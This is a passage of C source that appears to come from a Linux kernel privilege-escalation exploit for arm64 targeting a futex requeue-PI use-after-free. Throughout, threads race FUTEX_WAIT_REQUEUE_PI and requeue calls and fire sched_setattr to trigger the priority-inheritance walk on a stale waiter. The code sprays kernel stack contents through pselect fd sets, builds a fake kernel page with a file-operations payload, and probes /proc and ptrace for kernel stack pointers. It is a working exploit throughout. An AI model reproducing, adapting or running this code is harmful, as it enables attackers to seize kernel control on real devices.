    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (seq == 1) {
      usleep(PSELECT_ENTER_DELAY_USEC);
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    atomic_store(&slide_consume_inflight, 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    /* Retry: the futex UAF race may not have left pi_blocked_on set on
     * the first attempt, and sched_setattr itself may transiently fail.
     * Multiple calls give more chances for the PI walk to fire. */
    for (int retry = 0; retry < 9; retry++) {
      if (ret == 0) {
        int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
        atomic_store(&slide_consume_sched_ok, sched_ok);
        break;
      }
      usleep(2000);
      errno = 0;
      ret = sched_setattr_tid(tid, ((calls + retry + 1) % 19) + 1);
      saved_errno = errno;
    }
    atomic_store(&slide_consume_stop, 1);
    atomic_store(&slide_consume_inflight, 0);
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  errno = 0;
  int futex_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  pr_info("slide waiter futex_requeue_pi ret=%d errno=%d\n",
          futex_ret, errno);

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&slide_owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}


void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    atomic_store(&slide_owner_chain_done, 1);
    atomic_store(&slide_owner_stop, 1);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  /* DO NOT lock pi_chain here: that creates a PI cycle
   * (waiter→pi_target→owner→pi_chain→waiter) and makes the requeue
   * return -EDEADLK.  The owner just holds pi_target; the requeue
   * can then proxy-queue the waiter onto pi_target's rt_mutex. */
  atomic_store(&slide_owner_lock_ok, 1);
  atomic_store(&slide_owner_chain_done, 1);

  while (!atomic_load(&slide_owner_stop)) {
    sleep(1);
  }
  futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

static atomic_int h1a_waiter_ready;
static atomic_int h1a_waiter_waiting;
static atomic_int h1a_owner_started;
static atomic_int h1a_owner_chain_done;
static atomic_int h1a_owner_stop;
static atomic_int h1a_route_done;
static atomic_int h1a_waiter_tid;
static atomic_int h1a_punch_go;
static atomic_int h1a_punch_stop;
static atomic_int h1a_punch_calls;
static atomic_int h1a_punch_success;
static atomic_int h1a_punch_inflight;
static atomic_int h1a_punch_last_ret = -1;
static atomic_int h1a_punch_last_errno;

static atomic_int h1a_d_waiter_ready;
static atomic_int h1a_d_waiter_waiting;
static atomic_int h1a_d_owner_started;
static atomic_int h1a_d_owner_chain_done;
static atomic_int h1a_d_owner_stop;
static atomic_int h1a_d_route_done;
static atomic_int h1a_d_waiter_tid;
static atomic_int h1a_d_punch_allowed;
static atomic_int h1a_d_requeue_ret = 0;
static atomic_int h1a_d_requeue_errno;

static uint32_t h1a_d_f_wait;
static uint32_t h1a_d_f_pi_target;
static uint32_t h1a_d_f_pi_chain;

static uint32_t h1a_f_wait;
static uint32_t h1a_f_pi_target;
static uint32_t h1a_f_pi_chain;

#define H1A_PUNCH_WATCHDOG_TIMEOUT_MS 90000

static atomic_int h1a_w_waiter_ready;
static atomic_int h1a_w_waiter_waiting;
static atomic_int h1a_w_owner_started;
static atomic_int h1a_w_owner_chain_done;
static atomic_int h1a_w_owner_stop;
static atomic_int h1a_w_route_done;
static atomic_int h1a_w_waiter_tid;
static atomic_int h1a_w_pselect_enter;
static atomic_int h1a_w_unblock_fd;

static uint32_t h1a_w_f_wait;
static uint32_t h1a_w_f_pi_target;
static uint32_t h1a_w_f_pi_chain;

#define H1A_W_WATCHDOG_TIMEOUT_MS 60000
#define H1A_W_PSELECT_TIMEOUT_SEC 10
#define H1A_W_STACK_FDS_OFFSET 0x210
#define H1A_W_STALE_WAITER_OFFSET 0x190
#define H1A_W_NT_PRSTATUS 1
#ifndef PTRACE_SEIZE
#define PTRACE_SEIZE 0x4206
#endif
#ifndef PTRACE_INTERRUPT
#define PTRACE_INTERRUPT 0x4207
#endif
#ifndef PTRACE_DETACH
#define PTRACE_DETACH 0x4208
#endif
#ifndef PTRACE_GETREGSET
#define PTRACE_GETREGSET 0x4204
#endif
#ifndef __WALL
#define __WALL 0x40000000
#endif

struct h1a_w_user_pt_regs {
  uint64_t regs[31];
  uint64_t sp;
  uint64_t pc;
  uint64_t pstate;
};

static pid_t h1a_w_start_watchdog(int *parent_fd) {
  int pfd[2];
  pid_t parent_pid = getpid();

  if (pipe(pfd) != 0) {
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    close(pfd[0]);
    close(pfd[1]);
    return -1;
  }
  if (pid == 0) {
    close(pfd[1]);
    struct pollfd p = { .fd = pfd[0], .events = POLLIN, .revents = 0 };
    int ret = poll(&p, 1, H1A_W_WATCHDOG_TIMEOUT_MS);
    if (ret <= 0) {
      pr_warning("H1A-W watchdog timeout parent=%d status=stuck\n",
                 parent_pid);
      kill(parent_pid, SIGKILL);
      _exit(2);
    }
    _exit(0);
  }

  pr_info("H1A-W watchdog started pid=%d parent=%d timeout_ms=%d\n",
          pid, parent_pid, H1A_W_WATCHDOG_TIMEOUT_MS);
  close(pfd[0]);
  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
  if (parent_fd) {
    *parent_fd = pfd[1];
  }
  return pid;
}

static void h1a_w_finish_watchdog(pid_t pid, int pfd) {
  if (pid < 0) {
    return;
  }
  if (pfd >= 0) {
    char one = 1;
    ssize_t ignored = write(pfd, &one, sizeof(one));
    (void)ignored;
    close(pfd);
  }
  int status = 0;
  waitpid(pid, &status, 0);
}

static int h1a_w_read_text(pid_t tid, const char *kind,
                           const char *suffix) {
  char path[64];
  char buf[2048];
  snprintf(path, sizeof(path), "/proc/%d/%s", (int)tid, suffix);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("H1A-W PROBE-DENIED proc=%s errno=%d\n", kind, errno);
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("H1A-W PROBE-DENIED proc=%s errno=%d\n", kind, saved_errno);
    return 0;
  }
  buf[n] = 0;
  pr_info("H1A-W proc=%s bytes=%zd\n", kind, n);
  pr_info("%s", buf);
  return 1;
}

static int h1a_w_read_stat_sp(pid_t tid, uint64_t *sp) {
  char path[64];
  char buf[4096];
  snprintf(path, sizeof(path), "/proc/%d/stat", (int)tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("H1A-W PROBE-DENIED proc=stat errno=%d\n", errno);
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("H1A-W PROBE-DENIED proc=stat errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  char *close_paren = strrchr(buf, ')');
  if (!close_paren) {
    pr_warning("H1A-W PROBE-DENIED proc=stat reason=parse\n");
    return 0;
  }
  char *p = close_paren + 1;
  /* kstkesp is field 29; state is field 3 and is the first field after
   * the comm close paren. */
  for (int field = 3; field <= 29; ++field) {
    while (*p && (*p == ' ' || *p == '\t')) ++p;
    if (*p == 0) {
      pr_warning("H1A-W PROBE-DENIED proc=stat reason=short-field\n");
      return 0;
    }
    if (field == 29) {
      char *end = NULL;
      unsigned long long value = strtoull(p, &end, 0);
      if (!end || end == p) {
        pr_warning("H1A-W PROBE-DENIED proc=stat reason=kstkesp\n");
        return 0;
      }
      *sp = (uint64_t)value;
      pr_info("H1A-W proc=stat kstkesp=%016llx\n",
              (unsigned long long)value);
      return 1;
    }
    while (*p && *p != ' ' && *p != '\t') ++p;
  }
  pr_warning("H1A-W PROBE-DENIED proc=stat reason=no-kstkesp\n");
  return 0;
}

static int h1a_w_get_regs(pid_t tid, uint64_t *sp, uint64_t *pc) {
  struct h1a_w_user_pt_regs regs;
  struct iovec io = { .iov_base = &regs, .iov_len = sizeof(regs) };

  long seize = syscall(SYS_ptrace, PTRACE_SEIZE, (long)tid, (void *)0,
                       (void *)0);
  if (seize != 0) {
    pr_warning("H1A-W PROBE-DENIED ptrace-seize errno=%d\n", errno);
    return 0;
  }

  errno = 0;
  long get = syscall(SYS_ptrace, PTRACE_GETREGSET, (long)tid,
                     (void *)H1A_W_NT_PRSTATUS, &io);
  if (get != 0) {
    pr_warning("H1A-W PROBE-DENIED ptrace-getregset errno=%d\n", errno);
  } else {
    *sp = regs.sp;
    *pc = regs.pc;
    pr_info("H1A-W ptrace pc=%016llx sp=%016llx pstate=%016llx\n",
            (unsigned long long)regs.pc, (unsigned long long)regs.sp,
            (unsigned long long)regs.pstate);
  }

  errno = 0;
  long interrupt = syscall(SYS_ptrace, PTRACE_INTERRUPT, (long)tid,
                           (void *)0, (void *)0);
  if (interrupt == 0) {
    int status = 0;
    pid_t stopped = waitpid((pid_t)tid, &status, __WALL);
    if (stopped < 0) {
      pr_warning("H1A-W ptrace wait failed errno=%d\n", errno);
    }
  } else {
    pr_warning("H1A-W ptrace interrupt failed errno=%d\n", errno);
  }

  errno = 0;
  long detach = syscall(SYS_ptrace, PTRACE_DETACH, (long)tid, (void *)0,
                        (void *)0);
  if (detach != 0) {
    pr_warning("H1A-W ptrace detach failed errno=%d\n", errno);
  }
  return get == 0;
}

static void h1a_w_collect_evidence(void) {
  pid_t tid = (pid_t)atomic_load(&h1a_w_waiter_tid);
  uint64_t stat_sp = 0;
  uint64_t ptrace_sp = 0;
  uint64_t ptrace_pc = 0;
  int stat_ok = h1a_w_read_stat_sp(tid, &stat_sp);
  int stack_ok = h1a_w_read_text(tid, "stack", "stack");
  int regs_ok = h1a_w_get_regs(tid, &ptrace_sp, &ptrace_pc);
  int evidence = stat_ok + stack_ok + regs_ok;

  pr_info("H1A-W expected offsets stack_fds=T-0x%03x "
          "stale_waiter=T-0x%03x\n",
          H1A_W_STACK_FDS_OFFSET, H1A_W_STALE_WAITER_OFFSET);
  pr_info("H1A-W evidence stat=%d stack=%d regs=%d sp=%016llx pc=%016llx\n",
          stat_ok, stack_ok, regs_ok,
          (unsigned long long)ptrace_sp, (unsigned long long)ptrace_pc);
  if (ptrace_sp) {
    pr_info("H1A-W if_sp=T stack_fds=%016llx stale_waiter=%016llx\n",
            (unsigned long long)(ptrace_sp - H1A_W_STACK_FDS_OFFSET),
            (unsigned long long)(ptrace_sp - H1A_W_STALE_WAITER_OFFSET));
  }

  const char *verdict = "PROBE-DENIED";
  if (regs_ok && is_kernel_ptr(ptrace_sp)) {
    verdict = "STACK-CONFIRMED";
  } else if (evidence > 0) {
    verdict = "PLACEMENT-UNKNOWN";
  }
  pr_info("H1A-W verdict=%s\n", verdict);
}

static void h1a_w_prepare_pselect_fds(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);
}

static void h1a_w_pselect_wait(void) {
  int pipefd[2] = { -1, -1 };
  int blocked_fd = -1;
  int unblock_fd = -1;

  if (pipe(pipefd) != 0) {
    pr_error("H1A-W pipe failed errno=%d\n", errno);
    atomic_store(&h1a_w_pselect_enter, 2);
    return;
  }
  unblock_fd = (int)fcntl(pipefd[1], F_DUPFD, KS_FD_PROTECT_MIN);
  blocked_fd = (int)fcntl(pipefd[0], F_DUPFD, KS_FD_PROTECT_MIN);
  close(pipefd[0]);
  close(pipefd[1]);
  pipefd[0] = pipefd[1] = -1;
  if (unblock_fd < 0 || blocked_fd < 0) {
    pr_error("H1A-W pipe fd protect failed unblock=%d blocked=%d errno=%d\n",
             unblock_fd, blocked_fd, errno);
    if (unblock_fd >= 0) close(unblock_fd);
    if (blocked_fd >= 0) close(blocked_fd);
    atomic_store(&h1a_w_pselect_enter, 2);
    return;
  }
  atomic_store(&h1a_w_unblock_fd, unblock_fd);

  int stdio_backup[3] = { -1, -1, -1 };
  for (int fd = 0; fd < 3; ++fd) {
    stdio_backup[fd] = fcntl(fd, F_DUPFD, KS_FD_PROTECT_MIN);
  }
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; ++fd) {
    dup2(blocked_fd, fd);
  }
  for (int fd = 0; fd < 3; ++fd) {
    if (stdio_backup[fd] >= 0) {
      dup2(stdio_backup[fd], fd);
    }
  }
  close(blocked_fd);
  blocked_fd = -1;

  fd_set in;
  fd_set out;
  fd_set ex;
  h1a_w_prepare_pselect_fds(&in, &out, &ex);
  struct timespec timeout = {
    .tv_sec = H1A_W_PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  pr_info("H1A-W pselect enter nfds=%d timeout=%d blocked-pipe=1\n",
          SLIDE_PSELECT_NFDS, H1A_W_PSELECT_TIMEOUT_SEC);
  atomic_store(&h1a_w_pselect_enter, 1);
  errno = 0;
  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;
  pr_info("H1A-W pselect returned ret=%d errno=%d\n", ret, saved_errno);

  if (unblock_fd >= 0) {
    close(unblock_fd);
    unblock_fd = -1;
  }
  atomic_store(&h1a_w_route_done, 1);
}

static void *h1a_w_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&h1a_w_waiter_tid, tid);

  if (futex_op(&h1a_w_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("H1A-W waiter lock chain errno=%d\n", errno);
    atomic_store(&h1a_w_route_done, 1);
    return NULL;
  }
  atomic_store(&h1a_w_waiter_ready, 1);
  while (!atomic_load(&h1a_w_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;
  atomic_store(&h1a_w_waiter_waiting, 1);
  errno = 0;
  int futex_ret = futex_op(&h1a_w_f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                           &timeout, &h1a_w_f_pi_target, 0);
  pr_info("H1A-W waiter futex_requeue_pi ret=%d errno=%d\n",
          futex_ret, errno);
  h1a_w_pselect_wait();
  futex_op(&h1a_w_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&h1a_w_owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

static void *h1a_w_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (futex_op(&h1a_w_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("H1A-W owner lock target errno=%d\n", errno);
    atomic_store(&h1a_w_owner_chain_done, 1);
    atomic_store(&h1a_w_owner_stop, 1);
    return NULL;
  }
  while (!atomic_load(&h1a_w_waiter_ready)) {
    usleep(1000);
  }
  atomic_store(&h1a_w_owner_started, 1);
  while (!atomic_load(&h1a_w_owner_stop)) {
    sleep(1);
  }
  futex_op(&h1a_w_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&h1a_w_owner_chain_done, 1);
  return NULL;
}

int slide_h1a_w_test(void) {
  pid_t watchdog_pid = -1;
  int watchdog_pipe = -1;
  int result = 2;

  pr_info("H1A-W route: placement probe, no page preparation, no punch, "
          "no CFI/full chain\n");
  h1a_w_f_wait = 0;
  h1a_w_f_pi_target = 0;
  h1a_w_f_pi_chain = 0;
  atomic_store(&h1a_w_waiter_ready, 0);
  atomic_store(&h1a_w_waiter_waiting, 0);
  atomic_store(&h1a_w_owner_started, 0);
  atomic_store(&h1a_w_owner_chain_done, 0);
  atomic_store(&h1a_w_owner_stop, 0);
  atomic_store(&h1a_w_route_done, 0);
  atomic_store(&h1a_w_waiter_tid, 0);
  atomic_store(&h1a_w_pselect_enter, 0);
  atomic_store(&h1a_w_unblock_fd, 0);

  watchdog_pid = h1a_w_start_watchdog(&watchdog_pipe);
  pthread_t waiter;
  pthread_t owner;
  SYSCHK(pthread_create(&waiter, NULL, h1a_w_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, h1a_w_owner_thread, NULL));

  while (!atomic_load(&h1a_w_waiter_waiting) ||
         !atomic_load(&h1a_w_owner_started)) {
    usleep(1000);
  }
  usleep(100000);
  errno = 0;
  futex_op(&h1a_w_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &h1a_w_f_pi_target, 0);
  pr_info("H1A-W requeue issued\n");

  int entered = 0;
  /* The waiter enters pselect only after its requeue wait times out
   * (SLIDE_WAIT_SECONDS); allow that plus margin before giving up. */
  for (int spin = 0; spin < (SLIDE_WAIT_SECONDS + 15) * 1000; ++spin) {
    entered = atomic_load(&h1a_w_pselect_enter);
    if (entered != 0) {
      break;
    }
    usleep(1000);
  }
  if (entered == 1) {
    usleep(250000);
    h1a_w_collect_evidence();
    int unblock_fd = atomic_load(&h1a_w_unblock_fd);
    if (unblock_fd > 0) {
      close(unblock_fd);
    }
  } else {
    pr_warning("H1A-W verdict=PROBE-DENIED reason=pselect-not-entered\n");
  }

  /* Closing the sole write end wakes the blocked pselect immediately;
   * the 10s timeout remains the secondary safety net. */
  while (!atomic_load(&h1a_w_route_done)) {
    usleep(10000);
  }
  atomic_store(&h1a_w_owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  h1a_w_finish_watchdog(watchdog_pid, watchdog_pipe);
  result = (atomic_load(&h1a_w_pselect_enter) == 1 &&
            atomic_load(&h1a_w_route_done) == 1) ? 0 : 3;
  pr_info("H1A-W %s\n", result == 0 ? "done" : "fail");
  return result;
}

static pid_t slide_h1a_start_watchdog(int *parent_fd) {
  int pfd[2];
  pid_t parent_pid = getpid();

  if (pipe(pfd) != 0) {
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    close(pfd[0]);
    close(pfd[1]);
    return -1;
  }
  if (pid == 0) {
    close(pfd[1]);
    struct pollfd p = { .fd = pfd[0], .events = POLLIN, .revents = 0 };
    int ret = poll(&p, 1, H1A_PUNCH_WATCHDOG_TIMEOUT_MS);
    if (ret <= 0) {
      pr_warning("H1A punch watchdog timeout parent=%d status=stuck\n",
                 parent_pid);
      kill(parent_pid, SIGKILL);
      _exit(2);
    }
    _exit(0);
  }

  pr_info("H1A punch watchdog started pid=%d parent=%d timeout_ms=%d\n",
          pid, parent_pid, H1A_PUNCH_WATCHDOG_TIMEOUT_MS);
  close(pfd[0]);
  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
  if (parent_fd) {
    *parent_fd = pfd[1];
  }
  return pid;
}

static void slide_h1a_finish_watchdog(pid_t pid, int pfd) {
  if (pid < 0) {
    return;
  }
  if (pfd >= 0) {
    char one = 1;
    ssize_t ignored = write(pfd, &one, sizeof(one));
    (void)ignored;
    close(pfd);
  }
  int status = 0;
  waitpid(pid, &status, 0);
}

static void slide_h1a_pselect_punch(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("H1A punch missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int high_read = fcntl(pipefd[0], F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("H1A punch F_DUPFD read errno=%d\n", errno);
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_select_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  atomic_store(&h1a_punch_calls, 0);
  atomic_store(&h1a_punch_success, 0);
  atomic_store(&h1a_punch_stop, 0);
  atomic_store(&h1a_punch_go, 1);

  struct timespec timeout = {
    .tv_sec = SLIDE_PSELECT_TIMEOUT_SEC,
    .tv_nsec = (long)SLIDE_PSELECT_TIMEOUT_USEC * 1000,
  };

  pr_info("H1A punch setup nfds=%d timeout=%d.%06ld\n",
          SLIDE_PSELECT_NFDS, SLIDE_PSELECT_TIMEOUT_SEC,
          (long)SLIDE_PSELECT_TIMEOUT_USEC);
  errno = 0;
  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;

  /* The stale waiter is still below SP until the punch returns. Keep
   * this loop syscall-free; the watchdog is the safety net for spin. */
  for (;;) {
    if (atomic_load(&h1a_punch_calls) > 0 &&
        atomic_load(&h1a_punch_inflight) == 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store(&h1a_punch_go, 0);

  int calls = atomic_load(&h1a_punch_calls);
  int success = atomic_load(&h1a_punch_success);
  pr_info("H1A punch returned ret=%d errno=%d calls=%d success=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, calls, success,
          atomic_load(&h1a_punch_last_ret),
          atomic_load(&h1a_punch_last_errno));
  pr_info("H1A load=%d\n", calls);

  close(high_read);
  close(pipefd[0]);
  close(pipefd[1]);
}

static void *slide_h1a_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  while (!atomic_load(&h1a_punch_stop)) {
    int seq = atomic_load(&h1a_punch_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&h1a_waiter_tid);
    usleep(PSELECT_ENTER_DELAY_USEC);
    atomic_store(&h1a_punch_inflight, 1);
    atomic_fetch_add(&h1a_punch_calls, 1);
    pr_info("H1A punch enter tid=%d nice=%d\n", tid,
            PSELECT_CONSUMER_NICE);
    errno = 0;
    long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
    int sched_errno = errno;
    pr_info("H1A punch first ret=%ld errno=%d\n", sched_ret, sched_errno);
    atomic_store(&h1a_punch_last_ret, (int)sched_ret);
    atomic_store(&h1a_punch_last_errno, sched_errno);
    if (sched_ret == 0) {
      atomic_fetch_add(&h1a_punch_success, 1);
    }
    /* inflight=0 releases the pselect waiter only after all punch state
     * is visible, matching the main-route release ordering. */
    atomic_store(&h1a_punch_inflight, 0);
    pr_info("H1A punch done tid=%d ret=%ld errno=%d\n", tid,
            sched_ret, sched_errno);
    atomic_store(&h1a_punch_go, 0);
    break;
  }
  return NULL;
}

static void *slide_h1a_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&h1a_waiter_tid, tid);

  if (futex_op(&h1a_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("H1A waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&h1a_waiter_ready, 1);
  while (!atomic_load(&h1a_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&h1a_waiter_waiting, 1);
  errno = 0;
  int futex_ret = futex_op(&h1a_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &h1a_f_pi_target, 0);
  pr_info("H1A waiter futex_requeue_pi ret=%d errno=%d\n",
          futex_ret, errno);

  slide_h1a_pselect_punch();
  atomic_store(&h1a_route_done, 1);
  futex_op(&h1a_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&h1a_owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

static void *slide_h1a_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  if (futex_op(&h1a_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("H1A owner lock target errno=%d\n", errno);
    atomic_store(&h1a_owner_chain_done, 1);
    atomic_store(&h1a_owner_stop, 1);
    return NULL;
  }

  while (!atomic_load(&h1a_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&h1a_owner_started, 1);
  atomic_store(&h1a_owner_chain_done, 1);
  while (!atomic_load(&h1a_owner_stop)) {
    sleep(1);
  }
  futex_op(&h1a_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

int slide_h1a_punch_test(void) {
  pid_t watchdog_pid = -1;
  int watchdog_pipe = -1;
  int result = 2;

  pr_info("H1A header: v12 encoding active, terminal rb nodes, nice=%d, "
          "delta=%d (no ks_delta_index read)\n",
          PSELECT_CONSUMER_NICE, SKB_DATA_DELTA);
  pr_info("H1A route: ADR-0003 punch-only test, one attempt\n");

  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("H1A fail step=page-prepare\n");
    return 2;
  }
  pr_info("H1A page prepared base=%016zx lock=%016zx w0=%016zx "
          "fops=%016zx\n",
          page_base, fake_lock, fake_w0, fake_fops);

  h1a_f_wait = 0;
  h1a_f_pi_target = 0;
  h1a_f_pi_chain = 0;
  atomic_store(&h1a_waiter_ready, 0);
  atomic_store(&h1a_waiter_waiting, 0);
  atomic_store(&h1a_owner_started, 0);
  atomic_store(&h1a_owner_chain_done, 0);
  atomic_store(&h1a_owner_stop, 0);
  atomic_store(&h1a_route_done, 0);
  atomic_store(&h1a_waiter_tid, 0);
  atomic_store(&h1a_punch_go, 0);
  atomic_store(&h1a_punch_stop, 0);
  atomic_store(&h1a_punch_calls, 0);
  atomic_store(&h1a_punch_success, 0);
  atomic_store(&h1a_punch_inflight, 0);
  atomic_store(&h1a_punch_last_ret, -1);
  atomic_store(&h1a_punch_last_errno, 0);

  watchdog_pid = slide_h1a_start_watchdog(&watchdog_pipe);
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, slide_h1a_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_h1a_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_h1a_consumer_thread, NULL));

  while (!atomic_load(&h1a_waiter_waiting) ||
         !atomic_load(&h1a_owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&h1a_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &h1a_f_pi_target, 0);
  pr_info("H1A requeue issued\n");

  while (!atomic_load(&h1a_route_done)) {
    usleep(10000);
  }
  atomic_store(&h1a_owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  slide_h1a_finish_watchdog(watchdog_pid, watchdog_pipe);

  ks_leak_diff_dump();

  result = (atomic_load(&h1a_punch_calls) == 1 &&
            atomic_load(&h1a_punch_success) == 1) ? 0 : 3;
  pr_info("H1A %s calls=%d success=%d\n",
          result == 0 ? "success" : "fail",
          atomic_load(&h1a_punch_calls),
          atomic_load(&h1a_punch_success));
  return result;
}

static void *h1a_d_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&h1a_d_waiter_tid, tid);
  /* slide_h1a_pselect_punch()/slide_h1a_consumer_thread() share the H1A
   * punch state; point them at this victim. */
  atomic_store(&h1a_waiter_tid, tid);

  if (futex_op(&h1a_d_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("H1A-D waiter lock chain errno=%d\n", errno);
    atomic_store(&h1a_d_route_done, 1);
    return NULL;
  }
  atomic_store(&h1a_d_waiter_ready, 1);
  while (!atomic_load(&h1a_d_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;
  atomic_store(&h1a_d_waiter_waiting, 1);
  errno = 0;
